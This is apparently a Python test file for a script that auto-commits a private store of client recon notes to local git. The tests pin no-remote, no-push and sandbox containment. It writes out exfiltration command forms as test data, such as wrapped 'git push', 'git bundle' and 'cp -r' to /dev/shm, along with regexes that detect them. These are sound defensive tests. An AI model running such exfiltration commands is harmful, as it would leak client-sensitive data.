"""Tests for scripts/analyze-service-index/commit.sh — the /analyze-service index autocommit.

WHAT IS BEING PROTECTED
-----------------------
`~/.claude/analyze-service-index/<scope>/<service>.md` is curated, hand-confirmed
recon nuance written by the /analyze-service write-back protocol. It is NOT
re-derivable by re-running recon, it holds client-identifying infrastructure
detail, and until 2026-08-06 it had no history, no backup and no host sync.

THREE LAYERS, DELIBERATELY
--------------------------
  1. POLICY — `--print-plan` is pure text and mutates nothing, so the staging
     policy is pinned without needing a commit.
  2. BEHAVIOUR — real `git` against real temp stores.
  3. SEAM — home.nix and the script are two surfaces; a perfect script wired to
     the wrong path is still a dead feature (RULES.md: "the defect lives in the
     SEAM nobody owns"). The unit's ExecStart is asserted to resolve to the file
     these tests exercise.

🔴 NOTHING HERE SKIPS. `git` is in run-tests.sh's REQUIRED_TOOLS and in the
flake's pytests check, so its absence is an ERROR, not a skip — a skipped backup
test reports safety it never measured. run-tests.sh pins EXPECTED_SKIPS as an
exact set, not a ceiling, so a skip added here breaks the gate on purpose.

Every negative control asserts THIS guard's own message, not merely a non-zero
exit: a control that passes because a different guard fired is green for the
wrong reason and stays green with the guard it claims to test deleted.
"""
from __future__ import annotations

import os
import re
import shutil
import subprocess
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
SCRIPTS = ROOT / "scripts"
SCRIPT = SCRIPTS / "analyze-service-index" / "commit.sh"
HOME_NIX = ROOT / "nix" / "home.nix"

sys.path.insert(0, str(SCRIPTS))

from testlib.mockbin import write_exec  # noqa: E402

# 🔴 Resolve the interpreter ONCE, to an absolute path, and NARROW IT HERE.
# `shutil.which` returns `str | None`, so leaving it unnarrowed makes every
# `subprocess.run([BASH, ...])` a `list[str | None]`. On a host without bash
# that surfaces as a TypeError from deep inside subprocess — a failure that
# names the wrong cause, which is the very shape this PR is fixing elsewhere.
# Fail once, here, with a message that says what is actually wrong.
_BASH = shutil.which("bash")
if _BASH is None:  # pragma: no cover - the flake check puts bash on PATH
    raise RuntimeError(
        "bash is not on PATH. It is declared in run-tests.sh REQUIRED_TOOLS and "
        "in the flake's pytests check; add it there rather than skipping these "
        "tests — a skipped backup test reports safety it never measured.")
BASH: str = _BASH


def _run(store, *args, **env):
    """Invoke the committer. bash is resolved to an absolute path — never via a
    shebang and never through an interpreter that may be absent in the sandbox."""
    e = dict(os.environ)
    e.update({k: str(v) for k, v in env.items()})
    return subprocess.run(
        [BASH, str(SCRIPT), *[str(a) for a in args], str(store)],
        capture_output=True, text=True, env=e)


def _git(repo, *args):
    return subprocess.run(["git", "-C", str(repo), *args],
                          capture_output=True, text=True)


def _seed(tmp_path, scope="some-scope", files=("alpha.md", "beta.md")):
    """A store with one scope directory holding a couple of index files."""
    store = tmp_path / "store"
    (store / scope).mkdir(parents=True)
    for i, name in enumerate(files):
        (store / scope / name).write_text(f"content {i}\n", encoding="utf-8")
    return store


def _commits(repo):
    p = _git(repo, "rev-list", "--count", "HEAD")
    return int(p.stdout.strip()) if p.returncode == 0 else 0


# --------------------------------------------------------------------------- #
# 0. harness self-validation
# --------------------------------------------------------------------------- #
def test_the_script_exists_and_is_executable():
    assert SCRIPT.is_file(), f"{SCRIPT} missing — every test below is vacuous"
    assert os.access(SCRIPT, os.X_OK), f"{SCRIPT} is not executable"


def test_git_is_on_path():
    """🔴 NOT a skipif. `git` is declared in run-tests.sh REQUIRED_TOOLS and in
    the flake's pytests check. If it were missing, every behavioural test below
    would stop measuring anything — so fail loudly and name the fix."""
    assert shutil.which("git") is not None, (
        "git is not on PATH. Add it to the pytests check in flake.nix (and "
        "REQUIRED_TOOLS in scripts/run-tests.sh) rather than skipping these "
        "tests — a skipped backup test reports safety it never checked.")


# --------------------------------------------------------------------------- #
# 1. policy, via --print-plan (pure text, no mutation)
# --------------------------------------------------------------------------- #
def test_print_plan_states_there_is_no_remote(tmp_path):
    p = _run(_seed(tmp_path), "--print-plan")
    assert p.returncode == 0, p.stderr
    assert "remote:  none" in p.stdout


def test_print_plan_states_staging_is_explicit(tmp_path):
    p = _run(_seed(tmp_path), "--print-plan")
    assert "never -A" in p.stdout and "never --all" in p.stdout


def test_print_plan_lists_the_index_files_as_candidates(tmp_path):
    p = _run(_seed(tmp_path), "--print-plan")
    assert "alpha.md" in p.stdout and "beta.md" in p.stdout


def test_print_plan_mutates_nothing(tmp_path):
    """A plan that initialises a repo is not a plan."""
    store = _seed(tmp_path)
    _run(store, "--print-plan")
    assert not (store / "some-scope" / ".git").exists()
    assert not (store / ".git").exists()


def test_print_plan_names_the_scope_it_would_initialise(tmp_path):
    p = _run(_seed(tmp_path), "--print-plan")
    assert "some-scope" in p.stdout
    assert "would git init" in p.stdout


# --------------------------------------------------------------------------- #
# 2. the happy paths
# --------------------------------------------------------------------------- #
def test_absent_store_is_a_clean_no_op(tmp_path):
    p = _run(tmp_path / "does-not-exist")
    assert p.returncode == 0, p.stderr
    assert "nothing to do" in p.stdout


def test_first_run_creates_the_repo_at_the_scope_directory(tmp_path):
    """🔴 GRANULARITY. One repo per scope. A repo at the store root would
    silently absorb every scope added later, defeating per-scope remote policy."""
    store = _seed(tmp_path)
    p = _run(store)
    assert p.returncode == 0, p.stderr
    top = _git(store / "some-scope", "rev-parse", "--show-toplevel").stdout.strip()
    assert Path(top).resolve() == (store / "some-scope").resolve()


def test_the_store_root_never_becomes_a_repo(tmp_path):
    store = _seed(tmp_path)
    _run(store)
    assert not (store / ".git").exists(), "a repo was created at the STORE ROOT"


def test_first_run_commits_the_index_files(tmp_path):
    store = _seed(tmp_path)
    _run(store)
    tracked = _git(store / "some-scope", "ls-files").stdout.split()
    assert sorted(tracked) == ["alpha.md", "beta.md"]


def test_a_second_run_with_no_changes_makes_no_commit(tmp_path):
    store = _seed(tmp_path)
    _run(store)
    before = _commits(store / "some-scope")
    p = _run(store)
    assert p.returncode == 0, p.stderr
    assert "clean — nothing to commit" in p.stdout
    assert _commits(store / "some-scope") == before


def test_a_modified_file_is_committed(tmp_path):
    store = _seed(tmp_path)
    _run(store)
    before = _commits(store / "some-scope")
    (store / "some-scope" / "alpha.md").write_text("CHANGED\n", encoding="utf-8")
    p = _run(store)
    assert p.returncode == 0, p.stderr
    assert _commits(store / "some-scope") == before + 1
    assert _git(store / "some-scope", "status", "--porcelain").stdout == ""


def test_a_deleted_file_is_committed_as_a_deletion(tmp_path):
    """Explicit pathspecs still record removals — `git add <deleted-tracked>`
    stages the delete, so no `-u` and no `-A` is needed anywhere."""
    store = _seed(tmp_path)
    _run(store)
    (store / "some-scope" / "beta.md").unlink()
    p = _run(store)
    assert p.returncode == 0, p.stderr
    assert "beta.md" not in _git(store / "some-scope", "ls-files").stdout
    assert _git(store / "some-scope", "status", "--porcelain").stdout == ""


def test_the_commit_message_records_the_dirty_state_it_captured(tmp_path):
    store = _seed(tmp_path)
    _run(store)
    (store / "some-scope" / "alpha.md").write_text("CHANGED\n", encoding="utf-8")
    _run(store)
    msg = _git(store / "some-scope", "log", "-1", "--format=%B").stdout
    assert "M  alpha.md" in msg or "M alpha.md" in msg


def test_a_scope_with_no_markdown_and_no_repo_is_skipped_not_initialised(tmp_path):
    store = tmp_path / "store"
    (store / "empty-scope").mkdir(parents=True)
    p = _run(store)
    assert p.returncode == 0, p.stderr
    assert not (store / "empty-scope" / ".git").exists()


# --------------------------------------------------------------------------- #
# 3. 🔴 NEGATIVE CONTROLS — each asserts ITS OWN guard's message
# --------------------------------------------------------------------------- #
def test_a_locked_index_fails_loudly_instead_of_silently_no_opping(tmp_path):
    """🔴 THE control that makes this safety net believable. Make committing
    impossible and confirm the unit FAILS rather than reporting a clean no-op.

    Asserts the git-add failure specifically: a non-zero exit alone would also
    be produced by several other guards, and would stay green with this path
    deleted."""
    store = _seed(tmp_path)
    _run(store)
    (store / "some-scope" / "gamma.md").write_text("new\n", encoding="utf-8")
    lock = store / "some-scope" / ".git" / "index.lock"
    lock.write_text("", encoding="utf-8")
    try:
        p = _run(store)
    finally:
        lock.unlink()
    assert p.returncode != 0, "reported success while unable to commit"
    assert "git add failed" in p.stderr
    assert "index.lock" in p.stderr


def test_after_the_lock_clears_the_same_change_is_committed(tmp_path):
    """The complement of the control above: the failure must be transient, not a
    wedged unit. A guard that never recovers is a permanently-red gate."""
    store = _seed(tmp_path)
    _run(store)
    (store / "some-scope" / "gamma.md").write_text("new\n", encoding="utf-8")
    lock = store / "some-scope" / ".git" / "index.lock"
    lock.write_text("", encoding="utf-8")
    assert _run(store).returncode != 0
    lock.unlink()
    p = _run(store)
    assert p.returncode == 0, p.stderr
    assert "gamma.md" in _git(store / "some-scope", "ls-files").stdout


def test_an_untracked_non_markdown_file_is_never_swept_in(tmp_path):
    """The *.md allowlist is what stops a stray secret being blind-staged. It
    must neither commit the file NOR quietly exit 0 leaving it behind."""
    store = _seed(tmp_path)
    _run(store)
    (store / "some-scope" / "notes.txt").write_text("not an index file\n",
                                                    encoding="utf-8")
    p = _run(store)
    assert p.returncode != 0, "exited 0 with an uncommitted file left behind"
    assert "NOTHING staged" in p.stderr
    assert "notes.txt" not in _git(store / "some-scope", "ls-files").stdout


def test_a_leftover_file_after_a_real_commit_is_reported_not_swallowed(tmp_path):
    """🔴 REACHABILITY. The post-commit clean assertion is the guard that makes
    the *.md allowlist safe, and it is NOT the same guard as "NOTHING staged".

    A mutation sweep caught this: disabling the post-commit assertion killed no
    test at all, because every case that left a stray file also staged nothing,
    so the EARLIER guard always fired first and the later one never executed
    (RULES.md → unreachable guards). This case reaches it — a *.md edit that
    genuinely commits, PLUS a non-.md file that survives the commit — so the
    assertion has to run and report on its own.
    """
    store = _seed(tmp_path)
    _run(store)
    before = _commits(store / "some-scope")
    (store / "some-scope" / "alpha.md").write_text("CHANGED\n", encoding="utf-8")
    (store / "some-scope" / "notes.txt").write_text("stray\n", encoding="utf-8")
    p = _run(store)
    assert p.returncode != 0, "a file left uncommitted was reported as success"
    assert "STILL DIRTY" in p.stderr, (
        f"the post-commit assertion did not fire; stderr was:\n{p.stderr}")
    assert "notes.txt" in p.stderr
    # The .md edit really was committed — this guard reports on what remains, it
    # does not roll the commit back.
    assert _commits(store / "some-scope") == before + 1
    assert "notes.txt" not in _git(store / "some-scope", "ls-files").stdout


def test_a_scope_inside_a_foreign_repo_is_refused(tmp_path):
    """`git rev-parse` walks UP. Without this guard the script would commit
    client-sensitive content into whatever repo happens to enclose the store."""
    store = tmp_path / "parentstore"
    (store / "inner").mkdir(parents=True)
    subprocess.run(["git", "init", "-q", "-b", "trunk", str(store)], check=True)
    (store / "inner" / "thing.md").write_text("x\n", encoding="utf-8")
    p = _run(store)
    assert p.returncode != 0
    assert "not its own repo" in p.stderr


def test_dot_directories_are_not_enumerated_as_scopes(tmp_path):
    """REGRESSION. Found by the nested-repo control: a bare `-type d` walk
    enumerated the enclosing repo's own `.git` AS A SCOPE and the script started
    reasoning about git internals."""
    store = tmp_path / "parentstore"
    (store / "inner").mkdir(parents=True)
    subprocess.run(["git", "init", "-q", "-b", "trunk", str(store)], check=True)
    (store / "inner" / "thing.md").write_text("x\n", encoding="utf-8")
    p = _run(store)
    assert "scope .git" not in (p.stdout + p.stderr)


def test_one_broken_scope_fails_the_run_but_the_others_still_commit(tmp_path):
    """A backup job must not let one bad scope cost every other scope its
    backup — and must not report success because most of them worked."""
    store = _seed(tmp_path)
    (store / "other-scope").mkdir()
    (store / "other-scope" / "zeta.md").write_text("z\n", encoding="utf-8")
    _run(store)
    (store / "some-scope" / "alpha.md").write_text("CHANGED\n", encoding="utf-8")
    (store / "other-scope" / "zeta.md").write_text("Z CHANGED\n", encoding="utf-8")
    lock = store / "some-scope" / ".git" / "index.lock"
    lock.write_text("", encoding="utf-8")
    try:
        p = _run(store)
    finally:
        lock.unlink()
    assert p.returncode != 0
    assert "scope(s) FAILED" in p.stderr
    assert _git(store / "other-scope", "status", "--porcelain").stdout == "", (
        "the healthy scope was not committed")


# --------------------------------------------------------------------------- #
# 4. 🔴 the no-remote / no-network safety constraint
# --------------------------------------------------------------------------- #
def test_a_normal_run_adds_no_remote(tmp_path):
    store = _seed(tmp_path)
    _run(store)
    assert _git(store / "some-scope", "remote").stdout.strip() == ""


def test_a_configured_remote_is_never_pushed_to(tmp_path):
    """🔴 Even if a remote is somehow configured, this must not become an
    exfiltration path for client-identifying infrastructure detail.

    🔴 THE FAR SIDE IS A REAL INITIALISED BARE REPO. This test previously
    pointed `origin` at a path that did not exist and then asserted the path
    still did not exist and that no remote-tracking refs had appeared. A push to
    a nonexistent path can only fail, so NEITHER assertion could ever move — the
    test was a vacuous zero and killed exactly zero mutants, including a literal
    `git push origin trunk` (MEASURED). With a real bare fixture both assertions
    become live: the positive control below shows a push here produces
    `refs/heads/trunk` on the far side and `refs/remotes/origin/trunk` locally.
    """
    store = _seed(tmp_path)
    _run(store)
    far_side = tmp_path / "far-side.git"
    subprocess.run(["git", "init", "-q", "--bare", str(far_side)], check=True)
    _git(store / "some-scope", "remote", "add", "origin", str(far_side))
    (store / "some-scope" / "delta.md").write_text("d\n", encoding="utf-8")
    p = _run(store)
    assert p.returncode == 0, p.stderr

    far_refs = subprocess.run(
        ["git", "-C", str(far_side), "for-each-ref", "--format=%(refname)"],
        capture_output=True, text=True).stdout.strip()
    assert far_refs == "", f"refs were pushed to the far side: {far_refs}"
    refs = _git(store / "some-scope", "for-each-ref", "--format=%(refname)",
                "refs/remotes").stdout.strip()
    assert refs == "", f"remote-tracking refs appeared: {refs}"


def test_a_configured_remote_is_not_pushed_to_on_a_CLEAN_run(tmp_path):
    """🔴 THE STEADY-STATE PATH, which the dirty-run test above never reaches.

    That test writes `delta.md` before running, so it only ever exercises the
    branch that stages and commits. The overwhelming majority of real runs are
    the other one: nothing changed, "clean — nothing to commit", return early.
    A push bolted onto THAT branch — a sync-on-every-run, say — would have moved
    no assertion in this file.
    """
    store = _seed(tmp_path)
    _run(store)
    far_side = tmp_path / "far-side.git"
    subprocess.run(["git", "init", "-q", "--bare", str(far_side)], check=True)
    _git(store / "some-scope", "remote", "add", "origin", str(far_side))

    p = _run(store)
    assert p.returncode == 0, p.stderr
    assert "clean — nothing to commit" in p.stdout, (
        f"this run was not the clean path, so it proves nothing:\n{p.stdout}")

    far_refs = subprocess.run(
        ["git", "-C", str(far_side), "for-each-ref", "--format=%(refname)"],
        capture_output=True, text=True).stdout.strip()
    assert far_refs == "", f"a CLEAN run pushed refs to the far side: {far_refs}"
    refs = _git(store / "some-scope", "for-each-ref", "--format=%(refname)",
                "refs/remotes").stdout.strip()
    assert refs == "", f"a CLEAN run created remote-tracking refs: {refs}"


def test_the_far_side_fixture_would_actually_record_a_push(tmp_path):
    """🔴 POSITIVE CONTROL for the test above. Its two assertions are ZEROES,
    and a zero is indistinguishable from a fixture wired to nothing (RULES.md).
    Push to the same kind of fixture by hand and watch both numbers move."""
    store = _seed(tmp_path)
    _run(store)
    far_side = tmp_path / "far-side.git"
    subprocess.run(["git", "init", "-q", "--bare", str(far_side)], check=True)
    _git(store / "some-scope", "remote", "add", "origin", str(far_side))
    push = _git(store / "some-scope", "push", "origin", "trunk")
    assert push.returncode == 0, f"the fixture cannot even be pushed to: {push.stderr}"

    far_refs = subprocess.run(
        ["git", "-C", str(far_side), "for-each-ref", "--format=%(refname)"],
        capture_output=True, text=True).stdout.strip()
    assert "refs/heads/trunk" in far_refs, (
        "a real push produced no ref on the far side — the assertion in "
        "test_a_configured_remote_is_never_pushed_to cannot detect a push")
    refs = _git(store / "some-scope", "for-each-ref", "--format=%(refname)",
                "refs/remotes").stdout.strip()
    assert "refs/remotes/origin/trunk" in refs, (
        "a real push produced no remote-tracking ref — the second assertion "
        "cannot detect a push either")


def test_a_run_writes_nothing_outside_the_store(tmp_path):
    """🔴 BEHAVIOURAL no-exfiltration control, complementing the static ledger.

    The static check reads call sites; this one reads the FILESYSTEM. A mutation
    sweep produced a `cp -r "$scope" …` that copied two scope trees of
    client-sensitive data out of the store while every existing test passed. So:
    sandbox HOME, snapshot every path in the sandbox, run, and assert the only
    thing that changed is inside $STORE.

    🔴 TMPDIR IS SANDBOXED TOO, and that is not tidiness. A later sweep wrote
    `cp -r "$scope" "${TMPDIR:-/tmp}/leak"` and this test did NOT catch it: the
    snapshot only ever covered its own sandbox, so the script's actual scratch
    directory — the obvious place for a lazy exfil to land, and the one this
    script demonstrably writes to — was outside the observed set entirely.

    🔴 AND HERE IS WHAT IT STILL CANNOT SEE, stated rather than implied: a
    mutant writing to a HARDCODED absolute path outside the sandbox is invisible
    to any snapshot of this shape, because "everywhere else" is not enumerable.
    That residue is why the primary control is containment, not detection.

    🔴 THE PREVIOUS SENTENCE HERE WAS FALSE, AND IT WAS THE JUSTIFICATION FOR
    LEAVING THIS HOLE OPEN. It read: "under the unit's ProtectSystem=strict/
    ProtectHome=tmpfs sandbox there IS no writable path outside the store, so the
    hardcoded-path variant fails at the kernel". MEASURED 2026-08-07 under
    exactly those directives, `systemd-run --user`, journal-captured:

        cp -r <store> /dev/shm/asi-leak   →  rc=0

    and after the unit exited the HOST still held every file, mode 644, under a
    1777 directory. A mutant doing precisely that survived all 75 tests. The
    comment was not decoration — it is the reason this residue was accepted as
    covered, so being wrong about it left the hole open in both layers at once.

    /dev/shm is now closed by InaccessiblePaths on the unit (MEASURED: rc=1,
    "Permission denied", /dev/shm is `d---------` inside the namespace), and
    test_the_unit_is_contained_so_exfiltration_has_nowhere_to_go pins it.

    What is HONESTLY true, at the scope it was measured: the directives named
    there, TOGETHER, leave no writable path outside the store — on the paths
    that have been probed. No test in this repo can check that; the nix build
    sandbox has no systemd. This test remains the second line, and the sentence
    above is a reminder that the first line is only as good as its last live
    measurement.
    """
    sandbox = tmp_path / "sandbox"
    home = sandbox / "home"
    scratch = sandbox / "scratch"
    (home / "workspace" / "devrc" / "claudedocs").mkdir(parents=True)
    (home / "asi-leak-sentinel").mkdir(parents=True)
    scratch.mkdir(parents=True)
    store = _seed(sandbox)
    (sandbox / "bystander").mkdir()
    (sandbox / "bystander" / "keep.txt").write_text("untouched\n", encoding="utf-8")

    def snapshot():
        out = {}
        for p in sorted(sandbox.rglob("*")):
            if store in p.parents or p == store:
                continue
            out[str(p.relative_to(sandbox))] = (
                p.read_bytes() if p.is_file() and not p.is_symlink() else None)
        return out

    before = snapshot()
    p = _run(store, HOME=str(home), TMPDIR=str(scratch))
    assert p.returncode == 0, p.stderr
    after = snapshot()

    appeared = sorted(set(after) - set(before))
    vanished = sorted(set(before) - set(after))
    changed = sorted(k for k in set(before) & set(after) if before[k] != after[k])
    assert not appeared, f"the run created path(s) OUTSIDE the store: {appeared}"
    assert not vanished, f"the run deleted path(s) outside the store: {vanished}"
    assert not changed, f"the run modified path(s) outside the store: {changed}"


def test_the_outside_the_store_snapshot_can_actually_see_a_write(tmp_path):
    """🔴 POSITIVE CONTROL for the snapshot above — three more zero-assertions.
    Write outside the store by hand and confirm the comparison reports it."""
    sandbox = tmp_path / "sandbox"
    store = _seed(sandbox)
    (sandbox / "bystander").mkdir()

    def snapshot():
        out = {}
        for p in sorted(sandbox.rglob("*")):
            if store in p.parents or p == store:
                continue
            out[str(p.relative_to(sandbox))] = (
                p.read_bytes() if p.is_file() and not p.is_symlink() else None)
        return out

    before = snapshot()
    (sandbox / "bystander" / "LEAK-some-scope.md").write_text(
        "exfiltrated\n", encoding="utf-8")
    after = snapshot()
    assert sorted(set(after) - set(before)) == ["bystander/LEAK-some-scope.md"], (
        "the snapshot comparison cannot see a file written outside the store")


def _script_code_lines():
    """The script with comment-only lines stripped, so a prose mention of a
    forbidden command in the rationale does not read as a call site."""
    out = []
    for line in SCRIPT.read_text(encoding="utf-8").splitlines():
        if line.lstrip().startswith("#"):
            continue
        out.append(line)
    return out


# 🔴 THE ASSERTED LEDGER. The complete set of git subcommands commit.sh may
# invoke. Kept in ONE place, mirrored by the header comment in the script.
GIT_SUBCOMMAND_LEDGER = {
    "add", "check-ignore", "commit", "config", "diff", "init",
    "ls-files", "rev-parse", "status", "var",
}

# `.git` is a directory name (`"${scope}/.git/*"`), never an invocation. Nothing
# else may precede a real call — in particular a path prefix must NOT be excused,
# or `/run/current-system/sw/bin/git push` becomes invisible.
_GIT_CALL = re.compile(r"(?<!\.)\bgit\b(?P<rest>[^|;&]*)")

# `git` counts as a CALL only in command position. Command position = start of
# line, or straight after a separator (`;` `&` `|` `(` including `$(` `&&` `||`,
# `{` opening a brace group, `\` suppressing alias expansion), or after one of
# these words.
#
# 🔴 `{` and `\` are here because they were MEASURED to evade: `{ git push; }`
# and `\git push` both classified as not-a-call and were skipped silently.
_CMD_WORDS = {"capture", "if", "then", "do", "else", "elif", "while", "until", "!"}
_CMD_CHARS = (";", "&", "|", "(", "!", "{", "\\")

# 🔴 THE PROSE LEDGER — the residual, pinned as an EXACT SET.
#
# This is the fix for the class, not another pattern. The extractor used to
# `continue` on any `git` it could not place in command position, which silently
# excused every wrapper form: MEASURED, 8 of them (`env`, `timeout`, `nohup`,
# `command`, `eval "…"`, `xargs`, `sudo`, and a bare `{`) reached `git push`
# with the ledger reporting nothing at all.
#
# Now an unplaceable `git` is a VIOLATION unless it appears verbatim here. The
# legitimate residual is prose inside message strings, and commit.sh consolidates
# its failure reporting into one `git_failed` helper precisely so this list stays
# three lines long and readable. Adding a wrapper call site cannot pass: it is
# not in this set, so the set grows and the test fails. Rewording a message also
# fails, deliberately — that is what "asserted" means.
GIT_PROSE_LEDGER = {
    'command -v git >/dev/null 2>&1 ||',
    'echo "${PROG}: $1 git $2 failed (rc=$3)${4:+: $4}" >&2',
    '|| echo "no repo — would git init -b ${ASI_BRANCH}")" ;;',
}


def _in_command_position(prefix: str) -> bool:
    p = prefix.rstrip()
    if not p:
        return True
    if p.endswith(_CMD_CHARS):
        return True
    return p.split()[-1] in _CMD_WORDS


def _git_subcommands_invoked():
    """Classify EVERY `git` token in commit.sh. Nothing is silently dropped.

    Returns (concrete, indirect, unclassified):
      concrete     — subcommand names invoked in command position
      indirect     — call sites whose subcommand comes from a variable; ledger
                     violations by construction, since no static reading can say
                     what `$_s` expands to
      unclassified — every `git` that is NOT in command position. Prose in a
                     message string looks exactly like `env git push` to a
                     static reader, so these are not guessed at: they are
                     compared against GIT_PROSE_LEDGER as an exact set.
    """
    concrete, indirect, unclassified = set(), [], []
    for line in _script_code_lines():
        for m in _GIT_CALL.finditer(line):
            if not _in_command_position(line[:m.start()]):
                unclassified.append(line.strip())
                continue
            toks = m.group("rest").split()
            i = 0
            while i < len(toks):
                t = toks[i]
                if t in ("-C", "-c", "--git-dir", "--work-tree"):
                    i += 2
                    continue
                if t.startswith("-"):
                    i += 1
                    continue
                break
            if i >= len(toks):
                continue
            sub = toks[i].strip('"\'')
            if "$" in sub or "`" in sub:
                indirect.append(line.strip())
            else:
                concrete.add(sub)
    return concrete, indirect, unclassified


def test_the_set_of_git_subcommands_is_exactly_the_asserted_ledger():
    """🔴 AN ASSERTED LEDGER, NOT A BLOCKLIST — and it fails when the set GROWS
    *or* SHRINKS.

    The original version enumerated five forbidden verbs
    (push/fetch/pull/clone/ls-remote); `git archive -o …` and `git bundle
    create …` walked straight past it. An allowlist closes that: anything not
    named here is a failure, whether or not anybody thought to forbid it.

    🔴 BUT BE HONEST ABOUT WHAT IT STILL CANNOT SEE. This reads *git* call
    sites, so exfiltration that never invokes git is invisible to it — a plain
    `cp -r "$scope" …` always was and always will be. An earlier revision of
    this docstring claimed "an allowlist has no such blind spot", which was
    false. The control that stops `cp -r` is the unit's sandbox
    (ProtectHome=tmpfs + ProtectSystem=strict), pinned by
    test_the_unit_is_contained_so_exfiltration_has_nowhere_to_go; this ledger is
    secondary.

    Shrinking is a failure too — a ledger that silently tracks whatever the
    script happens to do is not an assertion about anything.
    """
    concrete, indirect, _ = _git_subcommands_invoked()
    assert not indirect, (
        "git subcommand supplied INDIRECTLY (via a variable or substitution); "
        "no static check can tell what it expands to, so this is a ledger "
        f"violation on its own: {indirect}")
    added = sorted(concrete - GIT_SUBCOMMAND_LEDGER)
    removed = sorted(GIT_SUBCOMMAND_LEDGER - concrete)
    assert not added, (
        f"commit.sh invokes git subcommand(s) NOT on the asserted ledger: {added}. "
        "If one of these is legitimate, add it to GIT_SUBCOMMAND_LEDGER *and* to "
        "the ledger comment in commit.sh — deliberately, in the same commit.")
    assert not removed, (
        f"the ledger names git subcommand(s) commit.sh no longer invokes: {removed}. "
        "Remove them from GIT_SUBCOMMAND_LEDGER and the script's header comment, "
        "so the ledger keeps asserting something.")


def test_every_unplaceable_git_token_is_pinned_prose():
    """🔴 THE WRAPPER CLASS, CLOSED AT THE ROOT.

    The extractor used to `continue` on a `git` it could not place in command
    position. MEASURED on the pre-fix tree: that single `continue` made `env git
    push`, `timeout 60 git push`, `nohup git push`, `command git push`, `eval
    "git push"`, `xargs git push`, `sudo git push` and `{ git push; }` ALL
    report an empty subcommand set — 8 wrapper forms, none of them on any
    blocklist, none of them visible.

    Enumerating wrappers would have been a fourth layer of the same mistake.
    Instead the residual is pinned: anything not in GIT_PROSE_LEDGER fails,
    whatever it happens to look like.
    """
    _, _, unclassified = _git_subcommands_invoked()
    seen = set(unclassified)
    surprising = sorted(seen - GIT_PROSE_LEDGER)
    vanished = sorted(GIT_PROSE_LEDGER - seen)
    assert not surprising, (
        "commit.sh contains `git` in a position this checker cannot read as a "
        f"call: {surprising}\n"
        "  If that is a WRAPPED invocation (env/timeout/eval/xargs/sudo/…), it "
        "is exactly the exfiltration path this test exists to stop — do not "
        "pin it.\n"
        "  If it is genuinely prose inside a message, prefer routing it through "
        "the git_failed helper; only add it to GIT_PROSE_LEDGER if it truly "
        "cannot be.")
    assert not vanished, (
        f"GIT_PROSE_LEDGER names line(s) commit.sh no longer contains: {vanished}. "
        "Remove them, so this set keeps asserting something rather than "
        "accumulating dead entries.")


def test_the_ledger_extractor_sees_what_it_claims_to_see():
    """🔴 POSITIVE CONTROL for the extractor. `added == []` and `surprising ==
    []` are ZEROES, and a zero is indistinguishable from a parser wired to
    nothing (RULES.md). Feed it every form that MUST be caught and watch each
    number move.

    The wrapper rows are the regression: every one of them returned an empty
    concrete set AND an empty indirect list on the pre-fix extractor.
    """
    wrapped = [
        '  env git -C "$scope" push origin trunk',
        '  timeout 60 git -C "$scope" push origin trunk',
        '  nohup git -C "$scope" push origin trunk',
        '  command git -C "$scope" push origin trunk',
        '  eval "git -C $scope push origin trunk"',
        '  echo trunk | xargs git -C "$scope" push origin',
        '  sudo git -C "$scope" push origin trunk',
    ]
    global _script_code_lines
    original = _script_code_lines
    try:
        _script_code_lines = lambda: [  # noqa: E731
            '  git -C "$scope" push origin trunk',
            '  git -C "$scope" archive -o /tmp/x.tar HEAD',
            '  _s=push; git -C "$scope" $_s origin trunk',
            '  git -C "$scope" status --porcelain',
            '  { git -C "$scope" bundle create /tmp/x.bundle --all; }',
            '  \\git -C "$scope" fetch origin',
        ]
        concrete, indirect, unclassified = _git_subcommands_invoked()

        per_wrapper = {}
        for line in wrapped:
            _script_code_lines = (lambda l=line: [l])
            c, i, u = _git_subcommands_invoked()
            per_wrapper[line.strip()] = (sorted(c), bool(i), bool(u))
    finally:
        _script_code_lines = original

    assert "push" in concrete, "the extractor missed a plain `git push`"
    assert "archive" in concrete, "the extractor missed `git archive`"
    assert "status" in concrete, "the extractor missed the -C-prefixed `git status`"
    assert "bundle" in concrete, (
        "the extractor missed `{ git bundle …; }` — `{` is not being treated as "
        "a command separator")
    assert "fetch" in concrete, (
        "the extractor missed `\\git fetch` — `\\` is not being treated as a "
        "command separator")
    assert indirect, "the extractor did not flag a variable-supplied subcommand"
    assert not unclassified, (
        f"these call sites should all have been placed: {unclassified}")

    for line, (c, ind, unc) in per_wrapper.items():
        assert ind or unc or (set(c) - GIT_SUBCOMMAND_LEDGER), (
            f"WRAPPER EVASION still invisible: {line!r} produced concrete={c}, "
            f"indirect={ind}, unclassified={unc} — nothing a test could fail on")


def test_the_script_never_blind_stages():
    """claude/RULES.md 🔴 — never `git add -A` / `--all` / `.`"""
    bad = re.compile(r"git\s[^|;&]*\badd\b[^|;&]*(\s-A\b|\s--all\b|\s\.\s*$)")
    hits = [l for l in _script_code_lines() if bad.search(l)]
    assert not hits, f"blind-staging call site(s): {hits}"


def test_the_forbidden_pattern_scanners_can_actually_match():
    """🔴 POSITIVE CONTROL for the two zero-assertions above. `not hits` is a
    ZERO, and a zero is indistinguishable from a regex wired to nothing
    (RULES.md). Feed both patterns a line that MUST match and watch the number
    move."""
    net = re.compile(r"\bgit\b[^|;&]*\b(push|fetch|pull|clone|ls-remote)\b")
    stage = re.compile(r"git\s[^|;&]*\badd\b[^|;&]*(\s-A\b|\s--all\b|\s\.\s*$)")
    assert net.search('  git -C "$scope" push origin trunk')
    assert stage.search('  git -C "$scope" add -A')
    assert stage.search('  git -C "$scope" add --all')
    # ...and must NOT match what the script actually does.
    assert not net.search('  git -C "$scope" commit -q -m "$msg"')
    assert not stage.search('  git -C "$scope" add -- "${paths[@]}"')


# --------------------------------------------------------------------------- #
# 5. bootstrap behaviour
# --------------------------------------------------------------------------- #
def test_asi_no_init_skips_an_uninitialised_scope(tmp_path):
    store = _seed(tmp_path)
    p = _run(store, ASI_NO_INIT="1")
    assert p.returncode == 0, p.stderr
    assert not (store / "some-scope" / ".git").exists()
    assert "skipping" in p.stdout


def test_an_identity_is_seeded_when_git_cannot_resolve_one(tmp_path):
    """A systemd unit cannot answer git's "please tell me who you are".

    🔴 THIS TEST USED TO FAIL IN THE WORSE TIER DIRECTION: it was green in the
    sandbox and RED on a host carrying a system-level /etc/gitconfig, because
    pointing HOME at an empty directory neutralises only the GLOBAL config —
    the system one is still read, resolves an identity, and no seeding happens.

